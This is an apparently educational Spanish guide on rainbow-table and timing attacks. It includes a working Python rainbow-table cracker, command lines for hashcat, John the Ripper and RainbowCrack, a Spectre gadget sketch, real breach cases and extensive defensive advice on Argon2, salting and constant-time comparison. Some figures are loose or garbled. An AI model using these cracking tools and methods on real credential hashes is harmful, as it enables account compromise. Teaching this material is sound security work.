### 📖 ¿QUÉ SON LAS RAINBOW TABLES?

**Rainbow Tables** son estructuras de datos precalculadas que permiten **invertir funciones hash criptográficas** de forma eficiente, convirtiendo un hash en su plaintext original. Representan un trade-off clásico entre **tiempo y espacio** en criptografía.

**Definición formal**:

Una rainbow table es una tabla de búsqueda que contiene:
- **Chains (cadenas)**: Secuencias de valores alternando entre hashes y "reducciones"
- **Endpoints (puntos finales)**: Solo se almacenan los puntos iniciales y finales de cada cadena
- **Reduction functions (funciones de reducción)**: Mapean hashes a plaintext candidatos

**Matemática**:

```
Proceso tradicional (ineficiente):
┌─────────────────────────────────────────────────────┐
│  Precomputar TODOS los hashes:                      │
│                                                      │
│  "password1" → md5() → 7c6a180b36896a0a8c02787eeaa│
│  "password2" → md5() → 6cb75f652a9b52798eb6cf2201│
│  "password3" → md5() → 819b0643d6b89dc9b579fdfc01│
│  ...                                                │
│  Almacenar: (plaintext, hash) ← Requiere MUCHO     │
│              espacio                                │
└─────────────────────────────────────────────────────┘

Rainbow table (eficiente):
┌─────────────────────────────────────────────────────┐
│  Crear cadenas usando reduction functions:          │
│                                                      │
│  Cadena 1:                                          │
│    start₁ → H → R₁ → H → R₂ → ... → Rₖ → end₁      │
│                                                      │
│  Cadena 2:                                          │
│    start₂ → H → R₁ → H → R₂ → ... → Rₖ → end₂      │
│                                                      │
│  Almacenar solo: (start₁, end₁), (start₂, end₂)    │
│                  ← Mucho menos espacio!             │
│                                                      │
│  Donde:                                             │
│    H  = Hash function (MD5, SHA1, etc.)             │
│    Rᵢ = Reduction function i (diferente en cada     │
│         columna para evitar colisiones)             │
└─────────────────────────────────────────────────────┘

Búsqueda (cuando tienes un hash):
1. Aplicar reducciones sucesivas hasta encontrar endpoint
2. Si encuentras endpoint en la tabla → Regenerar la cadena
3. Verificar cada valor en la cadena contra el hash objetivo
```

**Ejemplo simplificado**:

```python
def reduction_function(hash_value, column):
    """
    Reduce un hash a un plaintext candidato

    La función de reducción NO es inversa del hash (eso es imposible).
    Solo mapea el hash a un valor en el espacio de plaintext.
    """
    # Convertir hash a número
    num = int(hash_value, 16)
    # Aplicar transformación dependiente de la columna (evitar colisiones)
    reduced = (num + column) % 1000000  # Espacio de 1M passwords
    # Convertir a string
    return f"pass{reduced:06d}"

# Crear cadena
chain_length = 1000
start = "password123"

for i in range(chain_length):
    hash_val = hashlib.md5(start.encode()).hexdigest()
    start = reduction_function(hash_val, i)

# Almacenar solo: ("password123", start_final)
# Esto representa 1000 passwords usando solo 2 valores!
```

### 🤔 ¿POR QUÉ SON EFECTIVAS?

Rainbow tables explotan el hecho de que:

1. **Hashes son determinísticos**: Mismo input → Mismo hash siempre
2. **Muchos usuarios usan passwords comunes**: "123456", "password", "qwerty"
3. **Precomputación es rentable**: Computar una vez, usar miles de veces
4. **Trade-off tiempo-espacio favorable**:
   ```
   Ataque de fuerza bruta:
   - Tiempo: O(N) por cada hash (N = espacio de passwords)
   - Espacio: O(1) (no almacenar nada)

   Rainbow table:
   - Tiempo: O(t) donde t << N (tiempo de búsqueda en tabla)
   - Espacio: O(N/c) donde c = longitud de cadena (compresión!)
   - Precomputación: O(N) una sola vez
   ```

**Ejemplo numérico**:

```
Crackear MD5 de passwords alfanuméricos de 8 caracteres:

Espacio total: 62^8 ≈ 218 trillones de combinaciones

Fuerza bruta tradicional:
- Tiempo por hash: 218 trillones de hashes
- A 1 billón de hashes/seg: ~2.5 días por hash

Rainbow table:
- Tamaño: ~160 GB (con compresión de cadenas)
- Precomputación: 1 vez (1-2 semanas con GPUs)
- Cracking posterior: <5 minutos por hash
- Amortización: Después de ~500 hashes, es más eficiente que brute force
```

### 🎯 ¿PARA QUÉ SE USAN (Y DÓNDE)?

**Casos de uso legítimos**:
- **Forense digital**: Recuperar passwords de evidencia digital
- **Auditoría de seguridad**: Evaluar fortaleza de passwords
- **Investigación**: Analizar distribución de passwords en breaches
- **Educación**: Demostrar importancia de passwords fuertes y salt

**Ataques en la práctica**:
- Crackear hashes de bases de datos filtradas
- Ataques a protocolos sin salt (WPA/WPA2 sin SAE, NTLM)
- Análisis de breaches masivos (LinkedIn, Adobe, etc.)

**Herramientas públicas** (con rainbow tables):
- **CrackStation**: https://crackstation.net/ (15B hashes precomputados)
- **RainbowCrack**: Software open-source para generar y usar tablas
- **Ophcrack**: Especializado en passwords de Windows (NTLM/LM)
- **John the Ripper** + rainbow tables: Modo rainbow

### 🔍 CASO REAL: LinkedIn Breach (2012)

**Fecha**: Junio 2012 (publicado), pero breach ocurrió en 2012

**Impacto**:
- **6.5 millones de hashes SHA-1** publicados en foros underground
- Hashes **SIN SALT** (error crítico de LinkedIn)
- ~60% crackeados en **72 horas** usando rainbow tables + GPUs

**Detalles técnicos**:
```
Hash filtrado (ejemplo):
b89eaac7e61417341b710b727768294d0e6a277b  → ?

Proceso de cracking:
1. Identificar que es SHA-1 (160 bits, 40 hex chars)
2. Buscar en rainbow tables de SHA-1 para passwords comunes
3. Si no está en tabla, intentar con variaciones (1337 speak, dates)

Resultados:
- "123456" → Encontrado en <1 segundo (en tabla)
- "linkedin" → Encontrado en <1 segundo (ironía!)
- "password1" → Encontrado en <5 segundos
- "mypassword2012" → Encontrado en ~2 minutos (combinación)
```

**Consecuencias**:
- $1.25 millones de multa
- Demanda colectiva de $5 millones
- Reputación dañada
- Obligó a LinkedIn a implementar bcrypt con salt

**Lección**:
- Un solo error (no usar salt) comprometió millones de cuentas
- Rainbow tables convirtieron un ataque de meses en horas

### 💻 DEMOSTRACIÓN PRÁCTICA

```python
#!/usr/bin/env python3
"""
Rainbow Table Attack: Demostración educativa

Muestra:
1. Por qué hashes sin salt son vulnerables
2. Cómo funcionan las rainbow tables (simplificado)
3. Cómo el salt rompe el ataque
"""

import hashlib
import os
import time
from collections import defaultdict

class SimpleRainbowTable:
    """
    Implementación simplificada de rainbow table

    NOTA: Las rainbow tables reales son mucho más complejas.
    Esta es una versión didáctica para entender el concepto.
    """

    def __init__(self, hash_function='md5', chain_length=100, num_chains=10000):
        """
        Args:
            hash_function: 'md5', 'sha1', 'sha256'
            chain_length: Longitud de cada cadena (trade-off tiempo/espacio)
            num_chains: Número de cadenas (cobertura del espacio de passwords)
        """
        self.hash_func = hash_function
        self.chain_length = chain_length
        self.num_chains = num_chains
        self.table = {}  # {endpoint: startpoint}

    def hash(self, plaintext):
        """Calcula el hash de un plaintext"""
        h = hashlib.new(self.hash_func)
        h.update(plaintext.encode())
        return h.hexdigest()

    def reduce(self, hash_value, position):
        """
        Función de reducción: hash → plaintext candidato

        Args:
            hash_value: Hash hexadecimal
            position: Posición en la cadena (evita colisiones)

        Returns:
            str: Plaintext candidato
        """
        # Convertir hash a número
        num = int(hash_value[:16], 16)  # Usar solo primeros 16 hex chars

        # Aplicar transformación dependiente de posición
        reduced = (num + position * 12345) % 1000000

        # Generar password candidato
        return f"pass{reduced:06d}"

    def generate_table(self, progress_callback=None):
        """
        Genera la rainbow table precalculando cadenas

        Esto se hace UNA VEZ y se puede usar miles de veces.
        """
        print(f"\n[+] Generando rainbow table...")
        print(f"    Hash function: {self.hash_func}")
        print(f"    Chain length: {self.chain_length}")
        print(f"    Number of chains: {self.num_chains}")
        print(f"    Estimated coverage: ~{self.chain_length * self.num_chains:,} passwords")

        start_time = time.time()

        for chain_num in range(self.num_chains):
            # Generar punto de inicio aleatorio
            start = f"pass{chain_num:06d}"

            # Generar cadena
            current = start
            for position in range(self.chain_length):
                hash_val = self.hash(current)
                current = self.reduce(hash_val, position)

            # Almacenar solo endpoint → startpoint
            self.table[current] = start

            # Progress bar
            if chain_num % 100 == 0 and progress_callback:
                progress_callback(chain_num, self.num_chains)

        elapsed = time.time() - start_time
        size_mb = len(str(self.table)) / (1024 * 1024)

        print(f"\n[✓] Rainbow table generada!")
        print(f"    Tiempo: {elapsed:.2f} segundos")
        print(f"    Tamaño en memoria: {size_mb:.2f} MB")
        print(f"    Endpoints almacenados: {len(self.table):,}")

    def crack_hash(self, target_hash):
        """
        Intenta encontrar el plaintext de un hash usando la rainbow table

        Args:
            target_hash: Hash a crackear (hex string)

        Returns:
            str or None: Plaintext si se encuentra, None si no
        """
        print(f"\n[*] Intentando crackear: {target_hash}")

        # Buscar en cada posición posible de la cadena
        for start_position in range(self.chain_length):
            current_hash = target_hash

            # Aplicar reducciones hasta el final de la cadena
            for position in range(start_position, self.chain_length):
                reduced = self.reduce(current_hash, position)

                # ¿Este endpoint está en nuestra tabla?
                if reduced in self.table:
                    # ¡Encontrado! Regenerar la cadena desde el inicio
                    print(f"    [+] Endpoint encontrado: {reduced}")
                    print(f"    [+] Regenerando cadena desde: {self.table[reduced]}")

                    return self._regenerate_chain(self.table[reduced], target_hash)

                # Continuar la cadena
                current_hash = self.hash(reduced)

        print(f"    [✗] Hash no encontrado en la tabla")
        return None

    def _regenerate_chain(self, startpoint, target_hash):
        """Regenera una cadena y busca el hash objetivo"""
        current = startpoint

        for position in range(self.chain_length):
            current_hash = self.hash(current)

            if current_hash == target_hash:
                print(f"    [✓] ¡Encontrado! Plaintext: {current}")
                return current

            current = self.reduce(current_hash, position)

        return None

def demo_vulnerability():
    """
    Demuestra la vulnerabilidad de hashes sin salt
    """
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║                RAINBOW TABLE ATTACK - DEMOSTRACIÓN                ║
║                                                                   ║
║  Parte 1: Hashes sin salt (VULNERABLE)                           ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

    # Simular base de datos con hashes SIN salt (vulnerable)
    print("[*] Base de datos de usuarios (hashes MD5 SIN salt):")
    users = {
        "alice": "password123",
        "bob": "qwerty",
        "charlie": "123456",
        "diana": "pass789012",  # Este NO estará en la tabla pequeña
    }

    hashed_db = {}
    for username, password in users.items():
        hashed = hashlib.md5(password.encode()).hexdigest()
        hashed_db[username] = hashed
        print(f"    {username:10s} → {hashed}")

    # Generar rainbow table (pequeña para demo rápido)
    print("\n[!] Atacante genera rainbow table...")
    rainbow_table = SimpleRainbowTable(
        hash_function='md5',
        chain_length=100,
        num_chains=1000  # Pequeña para demo (cubre ~100k passwords)
    )

    def progress(current, total):
        if current % 100 == 0:
            pct = (current / total) * 100
            print(f"\r    Progreso: {pct:.1f}%", end='', flush=True)

    rainbow_table.generate_table(progress)

    # Intentar crackear cada hash
    print("\n\n[*] Atacante intercepta la base de datos y crackea los hashes...")
    cracked = 0

    for username, hash_val in hashed_db.items():
        print(f"\n--- Crackeando {username} ---")
        start_time = time.time()

        plaintext = rainbow_table.crack_hash(hash_val)

        elapsed = time.time() - start_time

        if plaintext:
            cracked += 1
            print(f"    [✓] Crackeado en {elapsed:.3f} segundos")
            print(f"    Password: {plaintext}")
            correct = plaintext == users[username]
            print(f"    ¿Correcto? {correct}")
        else:
            print(f"    [✗] No encontrado (fuera de cobertura de la tabla)")

    print(f"\n[!] Resultado: {cracked}/{len(users)} passwords crackeados")
    print(f"[!] Con una rainbow table real (160GB), se crackearian casi todos")

def demo_salt_protection():
    """
    Demuestra cómo el salt rompe el ataque de rainbow table
    """
    print("""

╔═══════════════════════════════════════════════════════════════════╗
║  Parte 2: Hashes CON salt (PROTEGIDO)                            ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

    # Simular base de datos con hashes CON salt (seguro)
    print("[*] Base de datos de usuarios (Argon2 CON salt único):")
    from argon2 import PasswordHasher

    ph = PasswordHasher()
    users = {
        "alice": "password123",
        "bob": "qwerty",
        "charlie": "123456",
    }

    salted_db = {}
    for username, password in users.items():
        # Argon2 automáticamente genera y almacena el salt en el hash
        hashed = ph.hash(password)
        salted_db[username] = hashed
        print(f"    {username:10s} → {hashed[:50]}...")

    print("\n[!] ¿Por qué esto es seguro contra rainbow tables?")
    print("    1. Cada usuario tiene un SALT ÚNICO (aleatorio)")
    print("    2. Atacante necesitaría una rainbow table POR CADA SALT")
    print("    3. Con salt de 128 bits → 2^128 tablas diferentes necesarias")
    print("    4. Tamaño total: 160 GB × 2^128 ≈ IMPOSIBLE de almacenar")

    # Demostrar diferencia
    print("\n[*] Comparación: Mismo password, diferentes sales:")
    same_password = "password123"
    hash1 = ph.hash(same_password)
    hash2 = ph.hash(same_password)
    hash3 = ph.hash(same_password)

    print(f"    Hash 1: {hash1[:50]}...")
    print(f"    Hash 2: {hash2[:50]}...")
    print(f"    Hash 3: {hash3[:50]}...")
    print(f"    ¿Son iguales? {hash1 == hash2}  ← ¡Cada uno es ÚNICO!")

    print("\n[✓] Conclusión: Salt rompe completamente las rainbow tables")

def demo_real_world_tools():
    """
    Demuestra herramientas reales para crackear hashes
    """
    print("""

╔═══════════════════════════════════════════════════════════════════╗
║  Parte 3: Herramientas Reales                                    ║
╚═══════════════════════════════════════════════════════════════════╝
    """)

    # Ejemplos de hashes comunes (MD5)
    test_hashes = {
        "5f4dcc3b5aa765d61d8327deb882cf99": "password",
        "e10adc3949ba59abbe56e057f20f883e": "123456",
        "25d55ad283aa400af464c76d713c07ad": "12345678",
        "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
    }

    print("[*] Hashes MD5 de passwords comunes:")
    for h in test_hashes.keys():
        print(f"    {h}")

    print("\n[*] Herramientas para crackear:")
    print("\n1. **CrackStation** (online, gratis):")
    print("   URL: https://crackstation.net/")
    print("   - 15 mil millones de hashes precomputados")
    print("   - Soporta: MD5, SHA1, SHA256, NTLM, etc.")
    print("   - Instant cracking para passwords comunes")

    print("\n2. **RainbowCrack** (offline, software):")
    print("   $ rainbowcrack md5 *.rt -h 5f4dcc3b5aa765d61d8327deb882cf99")
    print("   - Genera tus propias rainbow tables")
    print("   - Soporta GPUs (CUDA, OpenCL)")

    print("\n3. **John the Ripper** (rainbow + brute force):")
    print("   $ john --format=raw-md5 --wordlist=rockyou.txt hashes.txt")
    print("   - Modo híbrido: rainbow tables + reglas + brute force")

    print("\n4. **Hashcat** (más poderoso):")
    print("   $ hashcat -m 0 -a 0 hashes.txt rockyou.txt")
    print("   - Soporta 300+ tipos de hash")
    print("   - Extremadamente rápido con GPUs (billones de hashes/seg)")

    print("\n[*] Tiempos típicos con hardware moderno (RTX 4090):")
    print("    MD5:        200,000,000,000 hashes/segundo")
    print("    SHA-256:     80,000,000,000 hashes/segundo")
    print("    bcrypt:              30,000 hashes/segundo  ← MUCHO más lento!")
    print("    Argon2:               5,000 hashes/segundo  ← Diseñado para GPUs!")

# Ejecutar demos
if __name__ == "__main__":
    demo_vulnerability()

    input("\n[Presiona ENTER para continuar con la demostración de salt...]")
    demo_salt_protection()

    input("\n[Presiona ENTER para ver herramientas reales...]")
    demo_real_world_tools()

    print("""

╔═══════════════════════════════════════════════════════════════════╗
║  LECCIONES CLAVE                                                  ║
╚═══════════════════════════════════════════════════════════════════╝

1. NUNCA almacenar hashes sin salt
2. Usar algoritmos diseñados para passwords: Argon2, bcrypt, scrypt
3. Salt debe ser único por usuario (aleatorio, ≥16 bytes)
4. Rainbow tables son eficientes solo contra hashes sin salt
5. Con salt correcto, rainbow tables son inútiles

Referencias:
- LinkedIn Breach (2012): https://krebsonsecurity.com/2012/06/linkedin-breach-worse-than-first-thought/
- Argon2 (ganador PHC 2015): https://github.com/P-H-C/phc-winner-argon2
- OWASP Password Storage: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
    """)
```

### 📊 COMPARATIVA: STORAGE REQUIREMENTS

```
ESPACIO REQUERIDO PARA RAINBOW TABLES
════════════════════════════════════════════════════════════════

Password space: Alfanuméricos (a-zA-Z0-9) = 62 caracteres

┌───────────────────────────────────────────────────────────────┐
│ Longitud │ Combinaciones  │ Rainbow Table Size │ Tiempo Gen  │
├───────────────────────────────────────────────────────────────┤
│ 6 chars  │     57 billones│         8 GB        │   2 horas   │
│ 7 chars  │  3.5 trillones │        40 GB        │  12 horas   │
│ 8 chars  │  218 trillones │       160 GB        │   1 semana  │
│ 9 chars  │ 13.5 cuatril.  │       900 GB        │   1 mes     │
│ 10 chars │  839 cuatril.  │       5.5 TB        │   6 meses   │
└───────────────────────────────────────────────────────────────┘

Con salt único (128 bits):
┌───────────────────────────────────────────────────────────────┐
│ IMPOSIBLE: 160 GB × 2^128 = 5.4 × 10^39 Yottabytes          │
│                                                               │
│ Para referencia:                                             │
│   - Datos totales en Internet (2023): ~100 Zettabytes       │
│   - Rainbow tables con salt:   5,400,000,000,000 Zettabytes│
│                                                               │
│ ¡Es más fácil romper el universo que almacenar eso!         │
└───────────────────────────────────────────────────────────────┘
```

### ⚠️ MITIGACIÓN Y PREVENCIÓN

**Defensa #1: Salt Único por Usuario** (Esencial)

```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError
import os

ph = PasswordHasher(
    time_cost=3,        # Número de iteraciones
    memory_cost=65536,  # 64 MB de memoria
    parallelism=4,      # 4 threads
    hash_len=32,        # 256 bits de salida
    salt_len=16         # 128 bits de salt
)

def register_user(username, password):
    """
    Registro seguro con Argon2 + salt automático
    """
    # Argon2 genera automáticamente un salt único
    password_hash = ph.hash(password)

    # El hash almacena: algoritmo, parámetros, salt, y hash
    # Formato: $argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>

    save_to_database(username, password_hash)
    return password_hash

def verify_login(username, password):
    """
    Verificación segura
    """
    stored_hash = get_from_database(username)

    try:
        # verify() extrae el salt del hash almacenado y verifica
        ph.verify(stored_hash, password)

        # Opcional: Rehash si los parámetros han cambiado
        if ph.check_needs_rehash(stored_hash):
            new_hash = ph.hash(password)
            update_database(username, new_hash)

        return True
    except VerifyMismatchError:
        return False

# Ejemplo
hashed = register_user("alice", "my_secure_password_2024")
print(f"Hash almacenado: {hashed}")
# Output: $argon2id$v=19$m=65536,t=3,p=4$<16_bytes_salt_aleatorio>$<hash>
```

**Defensa #2: Algoritmos Lentos (Resistencia a GPUs)**

```python
import bcrypt

# bcrypt automáticamente incluye salt
password = b"user_password"

# Cost factor: 2^12 = 4096 iteraciones (ajustar según hardware)
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))

# Verificar
is_correct = bcrypt.checkpw(password, hashed)

# Nota: A mayor 'rounds', más lento (y más seguro)
# Recomendado: ajustar rounds para que tome ~100-500ms
```

**Comparación de Algoritmos**:

| Algoritmo | Salt Automático | Memoria Hard | GPU Resistant | Recomendado |
|-----------|----------------|--------------|---------------|-------------|
| MD5       | ❌ NO          | ❌ NO        | ❌ NO         | ❌ NUNCA   |
| SHA-256   | ❌ NO          | ❌ NO        | ❌ NO         | ❌ NUNCA   |
| bcrypt    | ✅ SÍ          | ⚠️ Parcial   | ⚠️ Parcial    | ⚠️ OK      |
| scrypt    | ✅ SÍ          | ✅ SÍ        | ✅ SÍ         | ✅ BUENO   |
| **Argon2id** | ✅ SÍ       | ✅ SÍ        | ✅ SÍ         | ✅ MEJOR   |

**Defensa #3: Pepper (Clave Secreta Global)**

```python
import hashlib
import hmac
import os
from argon2 import PasswordHasher

# Pepper: clave secreta almacenada fuera de la DB (env var, KMS, etc.)
PEPPER = os.getenv('PASSWORD_PEPPER')  # 32+ bytes aleatorios

ph = PasswordHasher()

def hash_with_pepper(password):
    """
    Combinar Argon2 (con salt) + pepper (HMAC)

    Doble protección:
    - Salt protege contra rainbow tables
    - Pepper protege si la DB se filtra pero el pepper no
    """
    # 1. Aplicar pepper con HMAC
    peppered = hmac.new(
        PEPPER.encode(),
        password.encode(),
        hashlib.sha256
    ).hexdigest()

    # 2. Aplicar Argon2 con salt
    final_hash = ph.hash(peppered)

    return final_hash

# Atacante necesita:
# 1. La base de datos (tiene salt)
# 2. El PEPPER (NO está en la DB)
# Sin ambos, no puede usar rainbow tables ni brute force eficiente
```

### 📋 CHECKLIST DE IMPLEMENTACIÓN SEGURA

**Almacenamiento de Passwords**:

- [ ] **Usar Argon2id** (primera opción) o bcrypt/scrypt (alternativas)
- [ ] **NUNCA MD5, SHA-1, SHA-256** para passwords (demasiado rápidos)
- [ ] Salt único automático (≥16 bytes aleatorios por usuario)
- [ ] Parámetros ajustados para ~100-500ms de tiempo de hash
- [ ] Considerar pepper adicional (clave secreta separada)
- [ ] Rehashing cuando cambien parámetros de seguridad
- [ ] Rate limiting en login (prevenir brute force online)

**Validación de Passwords**:

- [ ] Longitud mínima 12 caracteres (preferible 16+)
- [ ] Rechazar passwords en listas de breaches (Have I Been Pwned API)
- [ ] No limitar caracteres especiales (permitir Unicode)
- [ ] Verificación de fortaleza en cliente (zxcvbn, etc.)

**Respuesta a Breaches**:

- [ ] Monitoreo de credenciales filtradas (Have I Been Pwned)
- [ ] Política de rotación cuando se detecta breach
- [ ] 2FA/MFA obligatorio para cuentas sensibles

### 📚 REFERENCIAS ACADÉMICAS

1. **Oechslin, P.** (2003): *Making a Faster Cryptanalytic Time-Memory Trade-Off*. CRYPTO 2003. https://doi.org/10.1007/978-3-540-45146-4_36
   (Paper original que describe rainbow tables)

2. **LinkedIn Breach Post-Mortem** (2012): https://krebsonsecurity.com/2012/06/linkedin-breach-worse-than-first-thought/

3. **NIST SP 800-63B** (2017): *Digital Identity Guidelines - Authentication and Lifecycle Management*. https://doi.org/10.6028/NIST.SP.800-63b

4. **Biryukov, A., Dinu, D., & Khovratovich, D.** (2016): *Argon2: New Generation of Memory-Hard Functions for Password Hashing and Other Applications*. IEEE EuroS&P 2016. https://doi.org/10.1109/EuroSP.2016.31

5. **Hunt, T.** (2017): *Passwords Evolved: Authentication Guidance for the Modern Era*. Troy Hunt Blog. https://www.troyhunt.com/passwords-evolved-authentication-guidance-for-the-modern-era/

6. **OWASP Password Storage Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

7. **Project Rainbow Crack**: http://project-rainbowcrack.com/ (software y tablas)

8. **CrackStation**: https://crackstation.net/ (servicio de lookup con 15B hashes)

9. **Provos, N. & Mazières, D.** (1999): *A Future-Adaptable Password Scheme*. USENIX 1999. (Paper original de bcrypt)

---

## Ataque 4: Timing Attack

### 📖 ¿QUÉ ES UN TIMING ATTACK?

Un **Timing Attack** es un tipo de **side-channel attack** (ataque de canal lateral) que explota variaciones en el **tiempo de ejecución** de operaciones criptográficas para **extraer información secreta**. En lugar de atacar directamente el algoritmo matemático, el atacante mide cuánto tiempo toma ejecutar ciertas operaciones y usa esas mediciones para deducir datos sensibles.

**Definición formal**:

Un timing attack es un ataque donde el adversario:
1. **Observa** el tiempo de respuesta de un sistema criptográfico
2. **Correlaciona** tiempos con valores secretos (claves, passwords, tokens)
3. **Deduce** información sobre los secretos basándose en diferencias de timing

**Fundamento matemático**:

```
Operación vulnerable:
  if (secret_token[0] == guess[0]):
      if (secret_token[1] == guess[1]):
          if (secret_token[2] == guess[2]):
              ...
              return True
  return False

Timing observable:
  T(guess) = t_base + (num_bytes_correctos × t_comparacion)

Donde:
  - t_base: tiempo fijo (overhead de función)
  - num_bytes_correctos: cuántos bytes coinciden antes de fallar
  - t_comparacion: tiempo de comparar un byte (~1-10 nanosegundos)

Diferencia detectable:
  - 0 bytes correctos → T = 100.000 ns
  - 1 byte correcto  → T = 100.010 ns  (diferencia de 10 ns)
  - 2 bytes correctos → T = 100.020 ns
  ...
```

**Tipos de timing attacks**:

1. **Local timing attacks**: Atacante tiene acceso directo al sistema
   - Ejemplos: Malware, exploits locales
   - Precisión: nanosegundos

2. **Remote timing attacks**: Atacante está en la red
   - Ejemplos: Ataques a APIs web, autenticación remota
   - Precisión: microsegundos (con promediado)
   - Más difícil pero posible

3. **Cross-VM timing attacks**: Atacante en VM vecina (cloud)
   - Ejemplos: Ataques en AWS, Azure, GCP
   - Precisión: varía según aislamiento del hypervisor

### 🤔 ¿POR QUÉ FUNCIONAN?

Los timing attacks explotan varias características de las CPUs y lenguajes de programación modernos:

**1. Branch Prediction (Predicción de Saltos)**:
```
Código vulnerable:
  for i in range(len(secret)):
      if secret[i] != guess[i]:
          return False  # ← Sale temprano (branch taken)
  return True

CPU moderna:
  - Si la condición es False frecuentemente, el predictor aprende
  - Branch misprediction penalty: ~10-20 ciclos de CPU
  - Detectable con suficientes muestras
```

**2. Cache Timing**:
```
Datos en cache L1: ~4 ciclos (1 ns)
Datos en RAM:      ~200 ciclos (50 ns)

Si secret[0] está en cache → Rápido
Si secret[0] NO está en cache → Lento

Atacante puede "preparar" el cache y medir diferencias
```

**3. Memory Access Patterns**:
```
Acceso secuencial: Optimizado por prefetcher
Acceso aleatorio:  Más lento

Comparación byte-por-byte secuencial revela posición del error
```

**¿Por qué son tan peligrosos?**:
- Funcionan incluso con cifrado correcto (no rompen el algoritmo)
- Difíciles de detectar (no dejan logs, no requieren acceso privilegiado)
- Escalables a través de red (con suficientes muestras)
- Afectan a la mayoría de lenguajes (C, Python, Java, etc.)

### 🎯 ¿DÓNDE SE HAN EXPLOTADO?

**Contextos vulnerables**:

1. **Autenticación de tokens/cookies**:
   ```python
   # Vulnerable
   if request.cookies['auth_token'] == expected_token:
       allow_access()
   ```
   - Atacante puede deducir el token byte por byte
   - Común en APIs, sesiones web, JWT verification

2. **Verificación de firmas digitales**:
   - HMAC, RSA signatures, ECDSA
   - Implementaciones tempranas de OpenSSL, GnuTLS

3. **Password comparison**:
   ```python
   # Vulnerable
   if username == "admin" and password == db_password:
       login_success()
   ```
   - Timing revela si username existe (primero) y luego password

4. **Criptografía de clave privada**:
   - RSA decryption timing (Kocher's attack, 1996)
   - AES key schedule
   - Elliptic curve scalar multiplication

### 🔍 CASOS REALES

#### **Caso 1: OpenSSL Timing Attack (CVE-2003-0147, 2003)**

**Descubridor**: David Brumley y Dan Boneh (Stanford University)

**Vulnerabilidad**:
- **RSA decryption** en OpenSSL 0.9.7a y anteriores
- Implementación usaba **Chinese Remainder Theorem (CRT)** para optimización
- Tiempos de descifrado variaban según bits de la clave privada

**Matemática del ataque**:
```
RSA decryption con CRT:
  m = c^d mod N

Optimización CRT:
  m_p = c^{d_p} mod p  ← Tiempo depende de bits de d_p
  m_q = c^{d_q} mod q  ← Tiempo depende de bits de d_q
  m = CRT(m_p, m_q)

Si bit de d_p es 1 → Multiplicación extra → +10 μs
Si bit de d_p es 0 → Sin multiplicación   → +0 μs

Promediando 1 millón de muestras:
  Atacante deduce cada bit de la clave privada
```

**Impacto**:
- Atacante remoto podía **extraer clave privada RSA**
- Requería ~1 millón de conexiones SSL
- Tiempo total: ~2 horas en red local

**Patch**:
- OpenSSL implementó **RSA blinding**: Randomizar el input para enmascarar timing
```c
// Antes (vulnerable)
result = modpow(ciphertext, private_key, modulus);

// Después (seguro)
r = random();
blinded = (ciphertext * r^e) mod N;
result = modpow(blinded, private_key, modulus);
result = (result / r) mod N;  // Unblind
```

**Referencias**:
- Brumley, D. & Boneh, D. (2003): *Remote Timing Attacks are Practical*. USENIX Security 2003.
- CVE-2003-0147: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0147

---

#### **Caso 2: Keyczar Timing Attack (2009)**

**Descubridor**: Nate Lawson (Root Labs)

**Vulnerabilidad**:
- Keyczar (librería de Google) usaba comparación **byte-por-byte** para HMAC
- HMAC verification en Python:
```python
# Código vulnerable en Keyczar
def verify(expected_hmac, received_hmac):
    return expected_hmac == received_hmac  # ← Falla temprano!
```

**Explotación**:
```
Paso 1: Atacante envía HMAC con primer byte correcto
        Timing: T1 = 100.010 μs (un byte comparado)

Paso 2: Atacante envía HMAC con primer byte incorrecto
        Timing: T2 = 100.000 μs (falla inmediatamente)

Diferencia: T1 - T2 = 10 ns (detectable con 10,000 muestras)

Repetir para cada byte → Recuperar HMAC completo
```

**Impacto**:
- Atacante podía forjar tokens autenticados
- Afectaba a aplicaciones usando Keyczar para session tokens

**Patch**:
```python
# Implementación segura
import hmac

def verify(expected_hmac, received_hmac):
    return hmac.compare_digest(expected_hmac, received_hmac)
    # ← Comparación de tiempo constante
```

---

#### **Caso 3: Lucky Thirteen Attack (CVE-2013-0169, 2013)**

**Descubridores**: Nadhem AlFardan y Kenneth G. Paterson (Royal Holloway)

**Vulnerabilidad**:
- TLS con CBC mode (TLS 1.0, 1.1, 1.2)
- Timing diferencial en processing de padding

**Mecánica**:
```
TLS CBC record processing:
  1. Decrypt ciphertext            (tiempo constante)
  2. Check padding                 (timing leak!)
  3. Verify HMAC                   (timing leak!)

Si padding es inválido:
  - Rechazar inmediatamente → Rápido

Si padding es válido:
  - Verificar HMAC completo → Lento

Diferencia: ~10 μs (detectable en red local)
```

**Explotación**:
- Variante avanzada de padding oracle
- Atacante puede descifrar 1 byte de plaintext por cada 2^23 handshakes TLS
- Requiere ~2 días de tráfico activo

**Patch**:
- TLS 1.3 elimina CBC completamente (solo AEAD)
- TLS 1.2: Implementar constant-time padding verification

**Referencias**:
- AlFardan, N. J. & Paterson, K. G. (2013): *Lucky Thirteen: Breaking the TLS and DTLS Record Protocols*. IEEE S&P 2013.
- CVE-2013-0169

---

#### **Caso 4: Meltdown & Spectre (CVE-2017-5754, 2018)**

**Impacto global**: Casi todas las CPUs modernas (Intel, AMD, ARM)

**Relevancia a timing attacks**:
- **Spectre** explota speculative execution + timing de cache
- CPU ejecuta código especulativo que accede a memoria privilegiada
- Aunque la ejecución se "revierte", deja huellas en el cache
- Atacante mide timing de accesos a cache para extraer datos

**Ejemplo simplificado de Spectre**:
```c
// Código vulnerable (en kernel)
if (index < array_size) {  // ← Predictor de branch asume TRUE
    value = data[index];   // ← Se ejecuta especulativamente
    dummy = array2[value * 4096];  // ← Carga en cache
}

// Atacante (en userspace)
1. Entrenar predictor para asumir 'index < array_size' es TRUE
2. Enviar index > array_size (fuera de límites)
3. CPU ejecuta especulativamente las líneas 2-3
4. Aunque la ejecución se revierta, array2[value*4096] queda en cache
5. Atacante mide tiempo de acceso a cada page de array2
6. La página más rápida revela 'value' → Leak de memoria privilegiada
```

